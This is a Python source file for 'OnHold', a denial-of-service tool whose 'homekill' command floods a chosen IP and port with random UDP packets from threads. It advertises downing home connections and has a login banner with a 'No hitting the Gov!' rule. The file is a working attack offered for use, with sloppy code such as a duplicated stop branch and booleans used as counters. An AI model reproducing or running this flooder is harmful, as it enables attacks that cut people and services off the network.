#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os

banner = """
                        \033[31m╔═╗╔╗╔╦ ╦\033[37m╔═╗╦  ╔╦╗            
                        \033[31m║ ║║║║╠═╣\033[37m║ ║║   ║║            
                        \033[31m╚═╝╝╚╝╩ ╩\033[37m╚═╝╩═╝═╩╝            
                   ☎️  \033[31mPut those m\033[37mfs on hold ☎️
            \033[31m╔════════════════════════════════════════╗
            \033[31m║   \033[37mhomekill {ip} {port} {time} {2048}   \033[31m║
            \033[31m║    ╔══════════════════════════════╗    \033[31m║
            \033[31m╚════╣        Dashboard Help        ╠════╝
                 \033[31m║  \033[37mStop - Stops All Attacks    \033[31m║
                 \033[31m║  \033[37mClear - Clears Terminal     \033[31m║
                 \033[31m║  \033[37mUpdate - Updates \033[31mOn\033[37mHold     \033[31m║
                 \033[31m║  \033[37mExit - Exits OnHold         \033[31m║
                 \033[31m╚══════════════════════════════╝
"""

fsubs = True
liips = True
tattacks = True
uaid = True
said = True
iaid = True
haid = True
aid = True
attack = True
udp = True
tcp = True
syn = True
std = True
rand = True
homekill = True                                                

#methods
def udpsender(host, port, timer, punch):
	global uaid
	global ddosgaurd
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 10000000
	aid += 10000000
	tattacks += 10000000
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 10000000
	aid -= 10000000

#globals
def main():
	global fsubs
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global ovh
	global gamenuke
	global http

	while True:
		sys.stdout.write("\x1b]2;LIVE: ONHOLD HomeHolder | By @d3fe4ted, ENJOY! \x07")
		sin = input("\033[32muser\033[37m@\033[31monh\033[37mold~ ").lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "exit":
			print ("\033[32muser\033[37m@\033[31monh\033[37mold~  You Are Exiting Out Of OnHold Client.\n")
			exit()
		elif sinput == "attacks":
			print ("\033mHome connections downed: {}\n".format (aid))
			main()
		elif sinput == "update":
			os.system ("sh update.sh")
			print (banner)
			main()
		elif sinput == "homekill":
			if username == "Guest":
				print ("\033[31m[ONH\033[37mOLD] You Are Not Allowed To Use This Method.\n")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("\033[31m[ONH\033[37mOLD] Attack sent from OnHold Client to {}".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("\033[31m[ONH\033[37mOLD] The Command {} Requires An Argument.\n".format (sinput))
					main()
				except socket.gaierror:
					print ("\033[31m[ONH\033[37mOLD] Host: {} Invalid.\n".format (host))
					main()
		elif sinput == "stop":
			print ("\033[31m[ONH\033[37mOLD] All Running Attacks Have Been Stopped.\n")
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			what = sin.split(" ")[1]
			if what == "udp":
				print ("Stopping All homekill Attacks.\n")
				homekill = False
				while not udp:
					if aid == 0:
						print ("\033[31m[ONH\033[37mOLD] No homekill Processes Running.")
						homekill = True
						main()
		else:
			print ("[\033[31mSkidiot\033[00m] {} isn't a command.".format(sinput))
			main()



try:
	users = "root"
	clear = "clear"
	os.system (clear)
	username = getpass.getpass ("\033[31m╔════════════════════════════════════════════════════════════════╗\n\033[31m║                         \033[00mWelcome to \033[31mOn\033[00mHold!                     \033[31m║\n\033[31m║                   \033[00m[+] Rules and Information [+]                \033[31m║\n\033[31m║[+]==========================================================[+]\033[31m║\n\033[31m║      \033[00m----------- * Attacks tested and work * -----------       \033[31m║\n\033[31m║      \033[00m------------- * Created by D3fe4ted * -------------       \033[31m║\n\033[31m║      \033[00m----------- Press ENTER 2x to continue ------------       \033[31m║\n\033[31m╠═══════════════════════════════╦════════════════════════════════╣\n\033[31m║         \033[00m[+] Info [+]          \033[31m║          \033[00m[+] Rules [+]         \033[31m║\n\033[31m║                               ║                                \033[31m║\n\033[31m║[+]=========================[+]║[+]==========================[+]\033[31m║\n\033[31m║   \033[00m                            \033[31m║     \033[00mNo Skidripping/Skidding!   \033[31m║\n\033[31m║ \033[00m                              \033[31m║        \033[00mNo hitting the Gov!     \033[31m║\n\033[31m║                               ║                                \033[31m║\n\033[31m╚═══════════════════════════════╩════════════════════════════════╝\n Going Once >  ")
	if username in users:
		user = username
	else:
		print ("[+] Invalid Input\n")
		exit()
except KeyboardInterrupt:
	exit()
try:
	passwords = [""]
	password = getpass.getpass (" Going Twice >  ")
	if user == "":
		if password == passwords[0]:
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\033[31m[ONH\033[37mOLD] Ctrl-C Has Been Pressed.\n")
				main()
		else:
			print ("[*] Incorrect\n")
			exit()
except KeyboardInterrupt:
	exit()
